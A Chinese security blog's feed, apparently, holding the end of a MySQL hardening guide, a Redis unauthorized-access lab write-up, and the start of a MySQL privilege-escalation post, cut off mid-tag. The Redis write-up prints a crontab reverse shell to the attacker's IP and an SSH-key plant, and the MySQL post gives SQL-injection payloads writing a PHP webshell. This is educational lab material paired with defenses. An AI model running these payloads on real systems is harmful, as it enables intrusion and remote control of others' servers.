&lt;general_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;general_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="6-控制审计日志文件的权限"><a href="#6-控制审计日志文件的权限" class="headerlink" title="6. 控制审计日志文件的权限"></a>6. 控制审计日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables where variable_name =  &apos;audit_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;audit_log_file&gt; | egrep &quot;^-rw[-x]rw[-x][-r][-w][-x][ \t]*[0-9][ \t]*mysql[</span><br><span class="line">\t]*mysql.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;audit_log_file&gt;</span><br><span class="line">chown mysql:mysql &lt;audit_log_file&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-通用安全"><a href="#0x04-通用安全" class="headerlink" title="0x04 通用安全"></a>0x04 通用安全</h2><h3 id="1-安装最新的补丁"><a href="#1-安装最新的补丁" class="headerlink" title="1. 安装最新的补丁"></a>1. 安装最新的补丁</h3><p>在mysql命令行下查询MySQL的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name LIKE &quot;version&quot;;</span><br></pre></td></tr></table></figure><p>确认是否由需要安装的补丁包，如果有请安装。</p><h3 id="2-删除test数据库"><a href="#2-删除test数据库" class="headerlink" title="2. 删除test数据库"></a>2. 删除test数据库</h3><p>Mysql数据库默认安装好后，存在一个名为test的数据库，如果存在，请执行如下命令删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drop database “test”</span><br></pre></td></tr></table></figure><h3 id="3-确保读取本地文件的参数设置为失效"><a href="#3-确保读取本地文件的参数设置为失效" class="headerlink" title="3. 确保读取本地文件的参数设置为失效"></a>3. 确保读取本地文件的参数设置为失效</h3><p>Mysql命令行下，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name = &apos;local_infile&apos;;</span><br></pre></td></tr></table></figure><p>查看结果是否为OFF。</p><p>如果该命令为ON，则数据库用户可以通过LOAD DATA INFILE 或者 SELECT local_file 读取到数据库所在操作系统本地的文件，在这种情况下，需要在mysql配置文件中新增一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Local-infile=0；</span><br></pre></td></tr></table></figure><p>然后重启数据库服务。</p><h2 id="0x05-权限配置"><a href="#0x05-权限配置" class="headerlink" title="0x05 权限配置"></a>0x05 权限配置</h2><h3 id="1-控制可以访问所有数据库的账号"><a href="#1-控制可以访问所有数据库的账号" class="headerlink" title="1. 控制可以访问所有数据库的账号"></a>1. 控制可以访问所有数据库的账号</h3><p>Mysql数据库下的user表和db表中存放着可以授予数据库用户的权限，确保只有管理员账号才能访问所有数据库。可以访问mysql数据库的用户或许可以查看密码哈希值、修改用户权限等等。</p><p>使用如下sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host FROM mysql.user</span><br><span class="line">WHERE (Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;)  OR (Create_priv = &apos;Y&apos;)  OR (Drop_priv = &apos;Y&apos;);</span><br><span class="line">SELECT user, host FROM mysql.db WHERE db = &apos;mysql&apos;</span><br><span class="line">AND ((Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;) OR (Create_priv = &apos;Y&apos;) OR (Drop_priv = &apos;Y&apos;));</span><br></pre></td></tr></table></figure><p>确保返回结果只能是数据库管理员账号。</p><h3 id="2-限制非管理员用户的权限"><a href="#2-限制非管理员用户的权限" class="headerlink" title="2. 限制非管理员用户的权限"></a>2. 限制非管理员用户的权限</h3><p>Mysql.user表中的权限列有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_priv：表示是否允许用户读取数据库所在主机的本地文件；</span><br><span class="line">Process：表示是否允许用户查询所有用户的命令执行信息；</span><br><span class="line">Super_priv：表示用户是否有设置全局变量、管理员调试等高级别权限；</span><br><span class="line">Shutdown_priv：表示用户是否可以关闭数据库；</span><br><span class="line">Create_user_priv：表示用户是否可以创建或删除其他用户；</span><br><span class="line">Grant_priv：表示用户是否可以修改其他用户的权限；</span><br></pre></td></tr></table></figure><p>应确保只有数据库管理员才有上述权限，使用如下sql语句查看拥有各个权限的数据库账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select user, host from mysql.user where File_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Shutdown_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Create_user_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Grant_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.db WHERE Grant_priv = &apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>确保查询结果中不存在非管理员用户。</p><p>如果存在非管理员用户，使用如下命令进行权限回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REVOKE FILE ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE PROCESS ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SUPER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SHUTDOWN ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE CREATE USER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE GRANT OPTION ON *.* FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中user为上述查询到的非管理员用户。</p><h3 id="3-合理控制DML-DDL操作授权"><a href="#3-合理控制DML-DDL操作授权" class="headerlink" title="3. 合理控制DML/DDL操作授权"></a>3. 合理控制DML/DDL操作授权</h3><p>DML/DDL语句包括创建或修改数据库结构的权限，例如insert、update、delete、create、drop和alter语句，在任何数据库中都要控制用户的此类权限，确保只授权给有业务需求的非管理员用户。Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,Host,Db FROM mysql.db WHERE Select_priv=&apos;Y&apos;</span><br><span class="line">OR Insert_priv=&apos;Y&apos; OR Update_priv=&apos;Y&apos; OR Delete_priv=&apos;Y&apos; OR Create_priv=&apos;Y&apos;</span><br><span class="line">OR Drop_priv=&apos;Y&apos; OR Alter_priv=&apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>上述查询到的用户只能对特地的数据库才有相关的权限，使用如下命令进行相关权限的回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REVOKE SELECT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE INSERT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE UPDATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DELETE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE CREATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DROP ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE ALTER ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中<user>为查询到的未授权的用户，host为相关主机，database为相关数据库。</user></p><h2 id="0x06-审计和日志"><a href="#0x06-审计和日志" class="headerlink" title="0x06 审计和日志"></a>0x06 审计和日志</h2><h3 id="1-开启错误日志审计功能"><a href="#1-开启错误日志审计功能" class="headerlink" title="1. 开启错误日志审计功能"></a>1. 开启错误日志审计功能</h3><p>错误日志包括数据库运行和停止过程中的一系列活动信息，有助于分析数据库运行过程中的一些异常活动，一般情况下需要开启错误日志记录功能，使用如下命令查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW variables LIKE &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>确保返回结果为非空，如果为空，需要在mysql数据库配置文件中增加相关配置。</p><h3 id="2-确保日志存放在非系统区域"><a href="#2-确保日志存放在非系统区域" class="headerlink" title="2. 确保日志存放在非系统区域"></a>2. 确保日志存放在非系统区域</h3><p>日志文件随着数据库的运行会不断增加，如果存放在系统区域，则会影响系统的正常运行，使用如下命令进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.log_bin_basename;</span><br></pre></td></tr></table></figure><p>确保返回结果不是如下路径：/、/var、/usr</p><h3 id="3-关闭原始日志功能"><a href="#3-关闭原始日志功能" class="headerlink" title="3. 关闭原始日志功能"></a>3. 关闭原始日志功能</h3><p>原始日志选项会决定一些敏感信息是否会被明文写进日志中，例如查询日志、慢查询日志、二进制日志，确保数据库配置文件中存在如下配置项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log-raw = OFF</span><br></pre></td></tr></table></figure><h2 id="0x07-认证"><a href="#0x07-认证" class="headerlink" title="0x07 认证"></a>0x07 认证</h2><h3 id="1-Old-passwords环境变量设置"><a href="#1-Old-passwords环境变量设置" class="headerlink" title="1. Old_passwords环境变量设置"></a>1. Old_passwords环境变量设置</h3><p>Old_passwords决定了使用PASSWORD()函数和IDENTIFIED BY 、CREATE USER 、GRANT 等语句是时的hash算法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - authenticate with the mysql_native_password plugin</span><br><span class="line">1 - authenticate with the mysql_old_password plugin</span><br><span class="line">2 - authenticate with the sha256_password plugin</span><br></pre></td></tr></table></figure><p>设置为mysql_old_password代表弱hash算法，可以快速通过密码字典进行暴力破解。使用如下命令查询相关值：</p><p>SHOW VARIABLES WHERE Variable_name = ‘old_passwords’;</p><p>确保返回值不为1。</p><h3 id="2-secure-auth-选项设置"><a href="#2-secure-auth-选项设置" class="headerlink" title="2. secure_auth 选项设置"></a>2. secure_auth 选项设置</h3><p>如果客户端采用Old_passwords发起连接请求，如果服务器端设置了secure_auth，则客户端会拒绝连接请求，可以根据安全需求在配置文件中做相应配置。</p><h3 id="3-密码保存"><a href="#3-密码保存" class="headerlink" title="3. 密码保存"></a>3. 密码保存</h3><p>确保密码没有明文保存在全局配置文件中。</p><h3 id="4-确保所有用户都要求使用非空密码登录"><a href="#4-确保所有用户都要求使用非空密码登录" class="headerlink" title="4. 确保所有用户都要求使用非空密码登录"></a>4. 确保所有用户都要求使用非空密码登录</h3><p>执行如下语句查询是否有用户不需要密码即可登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,host</span><br><span class="line">FROM mysql.user</span><br><span class="line">WHERE (plugin IN(&apos;mysql_native_password&apos;, &apos;mysql_old_password&apos;)</span><br><span class="line">AND (LENGTH(Password) = 0</span><br><span class="line">OR Password IS NULL))</span><br><span class="line">OR (plugin=&apos;sha256_password&apos; AND LENGTH(authentication_string) = 0);</span><br></pre></td></tr></table></figure><h3 id="5-不存在空账号"><a href="#5-不存在空账号" class="headerlink" title="5. 不存在空账号"></a>5. 不存在空账号</h3><p>使用如下命令查询是否存在空账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,host FROM mysql.user WHERE user = &apos;&apos;;</span><br></pre></td></tr></table></figure><h2 id="0x08-网络设置"><a href="#0x08-网络设置" class="headerlink" title="0x08 网络设置"></a>0x08 网络设置</h2><p>如果mysql数据库服务器与应用是跨信任域部署的，则需要考虑在数据库服务器与应用服务器之间建立ssl通道进行数据传输，不过这种场景一般很少见，在此不详细描述。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL安全配置&quot;&gt;&lt;a href=&quot;#MySQL安全配置&quot; class=&quot;headerlink&quot; title=&quot;MySQL安全配置&quot;&gt;&lt;/a&gt;MySQL安全配置&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.net/ilnat
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2020-03-03T08:30:25.000Z</published>
    <updated>2020-03-03T09:24:07.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p>很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍Redis未授权访问的利用。</p><h2 id="Redis写Webshell"><a href="#Redis写Webshell" class="headerlink" title="Redis写Webshell"></a>Redis写Webshell</h2><p>首先在靶机Ubuntu和攻击机Kali上都配置Redis环境。查看一下两台机器的ip环境，靶机的ip为192.168.3.74：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E7%9A%84ip.png" alt></p><p>攻击机的ip为：192.168.3.66：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%9A%84ip.png" alt></p><p>在靶机上开启我们的Redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E5%BC%80%E6%9C%8D%E5%8A%A1.png" alt></p><p>然后我们在攻击机上通过命令连接redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E8%BF%9E%E6%8E%A5.png" alt></p><p>可以看到我们能连接到Redis服务器上，Redis的服务是暴露在外的。那么不多说直接设置目录然后写入shell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5shell.png" alt></p><p>然后就可以在靶机上看到了被植入了一个Webshell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5.png" alt></p><p>第一个实验写入Webshell到此成功执行。</p><h2 id="Redis写SSH公钥"><a href="#Redis写SSH公钥" class="headerlink" title="Redis写SSH公钥"></a>Redis写SSH公钥</h2><p>首先我们在攻击机上生成公私钥对，passphrase设置为空：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5.png" alt></p><p>我们把公钥写入一个文件1.txt中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6.png" alt></p><p>攻击机连接到靶机并把保存公钥的1.txt写入Redis中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E8%AE%BE%E7%BD%AE%E5%85%AC%E9%92%A5.png" alt></p><p>使用命令得到Redis的路径后修改到SSH公钥保存的目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG GET dir</span><br><span class="line">1)"dir"</span><br><span class="line">2)"/home/chenxiaoyi"</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1)"dbfilename"</span><br><span class="line">2)"authorized_keys"</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; EXIT</span><br></pre></td></tr></table></figure><p>然后我们退出连接后再在攻击机里面用SSH来连接到靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.3.74</span><br></pre></td></tr></table></figure><h2 id="Redis利用crontab反弹shell"><a href="#Redis利用crontab反弹shell" class="headerlink" title="Redis利用crontab反弹shell"></a>Redis利用crontab反弹shell</h2><p>这个就不进行实验了，贴一下代码。首先在攻击机上开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>然后连接到Redis后并写入反弹shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.74</span><br><span class="line">set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.3.66/4444 0&gt;&amp;1\n</span><br></pre></td></tr></table></figure><p>然后执行下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>最后在攻击机上就能收到一个shell。</p><blockquote><p>这里介绍一下crontab –  使用定时任务来反弹shell：</p><ul><li>系统任务调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/crontab</span><br></pre></td></tr></table></figure><ul><li>用户 XXX 调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine 下路径</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line"></span><br><span class="line">debian 下的路径（xxx 可以是任意东西）</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或者</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line">但是写这个路径的时候，文件内不能加用户名。</span><br></pre></td></tr></table></figure></blockquote><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ul><li><p>采用绑定IP的方式来进行控制</p><p>请在redis.conf文件找到如下配置</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="comment"># If you want you can bind a single interface, if the bind option is not``# specified all the interfaces will listen for incoming connections.``#``# bind 127.0.0.1`</span></span><br></pre></td></tr></table></figure><p>把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p><ul><li>设置密码，以提供远程登陆</li></ul><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`requirepass yourpassword``yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。`` ` `命令如下:``redis-cli -h yourIp -p yourPort``//启动redis客户端，并连接服务器``keys * ``//输出服务器中的所有key``报错如下``(error) ERR operation not permitted`` ` `这时候你可以用授权命令进行授权，就不报错了`` ` `命令如下:``auth youpassword`</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>渗透中可以多扫描一下6379的Redis端口，是个很好利用的点。然后要学会Redis的正确配置，防止被人攻下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a> </li><li><a href="https://nightmorning.site/wordpress/?p=755" target="_blank" rel="noopener">https://nightmorning.site/wordpress/?p=755</a> </li><li><a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis未授权访问&quot;&gt;&lt;a href=&quot;#Redis未授权访问&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问&quot;&gt;&lt;/a&gt;Redis未授权访问&lt;/h1&gt;&lt;p&gt;很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍R
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MYSQL提权</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/</id>
    <published>2020-03-02T07:58:51.000Z</published>
    <updated>2020-03-04T02:54:54.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL写Webshell"><a href="#MYSQL写Webshell" class="headerlink" title="MYSQL写Webshell"></a>MYSQL写Webshell</h1><p>写Webshell比较常见的方法有：</p><ul><li>select … into outfile</li><li>general_log</li></ul><hr><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>没有配置 <code>–secure-file-priv</code></li></ul><h3 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><ul><li>有 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile ‘/home/wwwroot/shadowyspirits/evil.php’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>无 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/shadowyspirits/evil.php’ fields terminated by ‘&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>其中 <code>fields terminated by</code> 是用来指定列之间分隔符，如果查询结果为单列则不会插入分隔符，所以必须有多个列才能成功写入一句话。</p><hr><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>需要能执行多行sql语句</li></ul><h3 id="2-利用方式-1"><a href="#2-利用方式-1" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'/home/wwwroot/shadowyspirits/evil.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p>设置了 <code>general_log</code> 和 <code>general_log_file</code> 之后所有SQL记录都会写入指定的文件，所以会导致 log 文件非常大，推荐只暂时打开</p><p>需要注意的是 <code>secure_file_priv</code> 是只读属性，如果试图使用 <code>set global</code> 修改会报如下 Error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error Code: 1238. Variable &apos;secure_file_priv&apos; is a read only</span><br></pre></td></tr></table></figure><h2 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h2><ul><li>设置 <code>secure_file_prive = null</code> （不允许导入和导出）</li><li>防止暴露网站绝对路径</li><li>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload </li><li>目录不授予执行权限</li></ul><hr><h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权一般有三种方法：</p><ul><li>mof提权</li><li>udf提权</li><li>反弹shell</li></ul><hr><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了<code>secure-file-priv</code></li></ul><h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" 